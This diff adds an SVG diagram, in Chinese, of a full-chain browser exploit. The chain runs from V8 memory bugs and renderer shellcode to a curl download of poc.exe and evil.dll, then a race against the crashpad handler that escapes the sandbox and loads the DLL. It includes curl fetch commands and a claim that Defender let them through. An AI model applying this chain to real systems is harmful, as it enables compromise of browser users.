@@ -1,0 +1,96 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="960" height="640" viewBox="0 0 960 640" font-family="'Segoe UI','Microsoft YaHei',sans-serif">
+  <defs>
+    <marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" fill="#455a64"/>
+    </marker>
+    <marker id="arb" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" fill="#1565c0"/>
+    </marker>
+  </defs>
+  <rect width="960" height="640" fill="#fafafa"/>
+  <text x="480" y="30" text-anchor="middle" font-size="19" font-weight="bold" fill="#263238">v4 全链架构：网页 → 渲染层 ACE → curl 落地 → crashpad OS 沙箱逃逸</text>
+  <text x="480" y="50" text-anchor="middle" font-size="12" fill="#607d8b">零硬编码本地路径：origin / chrome 路径 / TEMP 全部运行期自取</text>
+
+  <!-- origin server -->
+  <rect x="20" y="70" width="180" height="120" rx="8" fill="#e8f5e9" stroke="#2e7d32" stroke-width="1.5"/>
+  <text x="110" y="95" text-anchor="middle" font-size="14" font-weight="bold" fill="#1b5e20">同源 HTTP 服务器</text>
+  <text x="110" y="116" text-anchor="middle" font-size="11" fill="#33691e">runner.exe</text>
+  <text x="110" y="136" text-anchor="middle" font-size="11" fill="#33691e" font-family="Consolas,monospace">run_w4.html</text>
+  <text x="110" y="152" text-anchor="middle" font-size="11" fill="#33691e" font-family="Consolas,monospace">poc.exe (52 KB)</text>
+  <text x="110" y="168" text-anchor="middle" font-size="11" fill="#33691e" font-family="Consolas,monospace">evil.dll (11 KB)</text>
+
+  <!-- renderer lane -->
+  <rect x="230" y="70" width="470" height="270" rx="10" fill="#e3f2fd" stroke="#1565c0" stroke-width="1.5" stroke-dasharray="6 3"/>
+  <text x="465" y="92" text-anchor="middle" font-size="14" font-weight="bold" fill="#0d47a1">渲染进程（V8 沙箱内）</text>
+
+  <rect x="250" y="105" width="200" height="52" rx="6" fill="#bbdefb" stroke="#1565c0"/>
+  <text x="350" y="126" text-anchor="middle" font-size="12" font-weight="bold" fill="#0d47a1">stage1w.js</text>
+  <text x="350" y="143" text-anchor="middle" font-size="10.5" fill="#1565c0">87491 addrof + 85046 cage RW</text>
+
+  <rect x="250" y="172" width="200" height="52" rx="6" fill="#bbdefb" stroke="#1565c0"/>
+  <text x="350" y="193" text-anchor="middle" font-size="12" font-weight="bold" fill="#0d47a1">pocwin_full_w4.js</text>
+  <text x="350" y="210" text-anchor="middle" font-size="10.5" fill="#1565c0">异常符号伪造 → 跳表别名 → 部署</text>
+
+  <rect x="250" y="240" width="200" height="76" rx="6" fill="#90caf9" stroke="#0d47a1" stroke-width="1.5"/>
+  <text x="350" y="261" text-anchor="middle" font-size="12" font-weight="bold" fill="#0d47a1">payload_w4（2.6KB 机器码）</text>
+  <text x="350" y="278" text-anchor="middle" font-size="10.5" fill="#0d47a1">PEB→IAT→kernel32 5 导出</text>
+  <text x="350" y="294" text-anchor="middle" font-size="10.5" fill="#0d47a1">curl 拉双文件 → 启动竞态器</text>
+  <text x="350" y="310" text-anchor="middle" font-size="10.5" fill="#b71c1c">自旋 1s → 主动崩溃 0xDEAD0021</text>
+
+  <rect x="480" y="105" width="200" height="92" rx="6" fill="#e8eaf6" stroke="#3949ab"/>
+  <text x="580" y="127" text-anchor="middle" font-size="12" font-weight="bold" fill="#1a237e">g_origin 洞 @0x950</text>
+  <text x="580" y="146" text-anchor="middle" font-size="10.5" fill="#283593">JS 部署时注入</text>
+  <text x="580" y="162" text-anchor="middle" font-size="10.5" fill="#283593" font-family="Consolas,monospace">location.origin</text>
+  <text x="580" y="180" text-anchor="middle" font-size="10.5" fill="#283593">（逐 4 字节 arwWrite）</text>
+
+  <rect x="480" y="215" width="200" height="101" rx="6" fill="#e8eaf6" stroke="#3949ab"/>
+  <text x="580" y="237" text-anchor="middle" font-size="12" font-weight="bold" fill="#1a237e">curl.exe（系统自带）</text>
+  <text x="580" y="256" text-anchor="middle" font-size="10" fill="#283593" font-family="Consolas,monospace">-sf -o ms64.exe</text>
+  <text x="580" y="271" text-anchor="middle" font-size="10" fill="#283593" font-family="Consolas,monospace">  ORIGIN/poc.exe</text>
+  <text x="580" y="286" text-anchor="middle" font-size="10" fill="#283593" font-family="Consolas,monospace">-o ev64.dll</text>
+  <text x="580" y="301" text-anchor="middle" font-size="10" fill="#283593" font-family="Consolas,monospace">  ORIGIN/evil.dll</text>
+  <text x="580" y="313" text-anchor="middle" font-size="9.5" fill="#b71c1c">Defender 实测放行 ✓</text>
+
+  <line x1="200" y1="110" x2="248" y2="128" stroke="#455a64" stroke-width="1.5" marker-end="url(#ar)"/>
+  <text x="224" y="108" text-anchor="middle" font-size="10" fill="#455a64">HTTP</text>
+  <line x1="450" y1="131" x2="478" y2="145" stroke="#455a64" stroke-width="1.5" marker-end="url(#ar)"/>
+  <line x1="450" y1="198" x2="478" y2="250" stroke="#455a64" stroke-width="1.5" marker-end="url(#ar)"/>
+  <text x="464" y="228" text-anchor="middle" font-size="10" fill="#455a64">部署+点火</text>
+  <line x1="350" y1="157" x2="350" y2="170" stroke="#455a64" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <!-- racer lane -->
+  <rect x="230" y="370" width="300" height="120" rx="10" fill="#fff3e0" stroke="#e65100" stroke-width="1.5" stroke-dasharray="6 3"/>
+  <text x="380" y="392" text-anchor="middle" font-size="14" font-weight="bold" fill="#bf360c">ms64.exe 竞态器（%TEMP%，普通进程）</text>
+  <text x="380" y="413" text-anchor="middle" font-size="11" fill="#e65100" font-family="Consolas,monospace">--handler &lt;chrome自身路径&gt; --db %TEMP%\msdb</text>
+  <text x="380" y="431" text-anchor="middle" font-size="11" fill="#e65100" font-family="Consolas,monospace">--mode race --iters 8 --pages 41 --calc --dbg</text>
+  <text x="380" y="451" text-anchor="middle" font-size="10.5" fill="#bf360c">布防：41 smasher + 双洞 + 8 victim + bag</text>
+  <text x="380" y="468" text-anchor="middle" font-size="10.5" fill="#bf360c">patch CrashpadInfo.extra_memory_ranges</text>
+  <text x="380" y="485" text-anchor="middle" font-size="10.5" fill="#bf360c">6×NtCreateThreadEx(0x42) 翻页微脉冲</text>
+
+  <!-- handler lane -->
+  <rect x="560" y="370" width="380" height="120" rx="10" fill="#ffebee" stroke="#b71c1c" stroke-width="1.5" stroke-dasharray="6 3"/>
+  <text x="750" y="392" text-anchor="middle" font-size="14" font-weight="bold" fill="#b71c1c">crashpad-handler（非沙箱）</text>
+  <text x="750" y="413" text-anchor="middle" font-size="11" fill="#b71c1c">渲染器崩溃 → 读取 extra ranges</text>
+  <text x="750" y="431" text-anchor="middle" font-size="11" fill="#b71c1c" font-family="Consolas,monospace">ReadUpTo(0xB8) 撞 NOACCESS</text>
+  <text x="750" y="449" text-anchor="middle" font-size="11" fill="#b71c1c" font-family="Consolas,monospace">无钳位重试读 0x168 → 溢出 0xB0</text>
+  <text x="750" y="467" text-anchor="middle" font-size="11" fill="#b71c1c">SMMW 模板劫持 → plant 植入 → Flush</text>
+  <text x="750" y="485" text-anchor="middle" font-size="12" font-weight="bold" fill="#b71c1c">LoadLibraryW(ev64.dll) → calc + notepad</text>
+
+  <!-- flows between lanes -->
+  <line x1="465" y1="340" x2="400" y2="368" stroke="#1565c0" stroke-width="2" marker-end="url(#arb)"/>
+  <text x="416" y="352" text-anchor="middle" font-size="10.5" fill="#1565c0">①CreateProcessA + ②Wait 立即③CreateProcessA</text>
+  <line x1="530" y1="430" x2="558" y2="430" stroke="#b71c1c" stroke-width="2" marker-end="url(#ar)"/>
+  <text x="544" y="420" text-anchor="middle" font-size="10" fill="#b71c1c">崩溃</text>
+  <line x1="580" y1="316" x2="200" y2="192" stroke="#2e7d32" stroke-width="1.8" stroke-dasharray="5 4" marker-end="url(#ar)"/>
+  <text x="368" y="243" text-anchor="middle" font-size="10.5" fill="#2e7d32" transform="rotate(-17 368 243)">③ curl 下载 stage-2（同源）</text>
+
+  <!-- bottom: crash timeline -->
+  <rect x="20" y="520" width="920" height="96" rx="8" fill="#eceff1" stroke="#546e7a"/>
+  <text x="480" y="544" text-anchor="middle" font-size="13" font-weight="bold" fill="#37474f">胜负时序（主动崩溃的价值）</text>
+  <line x1="60" y1="575" x2="900" y2="575" stroke="#78909c" stroke-width="2"/>
+  <circle cx="140" cy="575" r="6" fill="#1565c0"/><text x="140" y="598" text-anchor="middle" font-size="10.5" fill="#37474f">竞态器启动</text>
+  <circle cx="330" cy="575" r="6" fill="#1565c0"/><text x="330" y="598" text-anchor="middle" font-size="10.5" fill="#37474f">布防完成（自旋 ~1s，V8 暂停无 GC）</text>
+  <circle cx="520" cy="575" r="6" fill="#b71c1c"/><text x="520" y="598" text-anchor="middle" font-size="10.5" fill="#b71c1c">写 0xDEAD0021 → 渲染器必崩</text>
+  <circle cx="690" cy="575" r="6" fill="#e65100"/><text x="690" y="598" text-anchor="middle" font-size="10.5" fill="#e65100">handler 收尸 → 竞态开跑</text>
+  <circle cx="860" cy="575" r="6" fill="#2e7d32"/><text x="860" y="598" text-anchor="middle" font-size="10.5" fill="#2e7d32">Flush → calc 弹出</text>
+</svg>
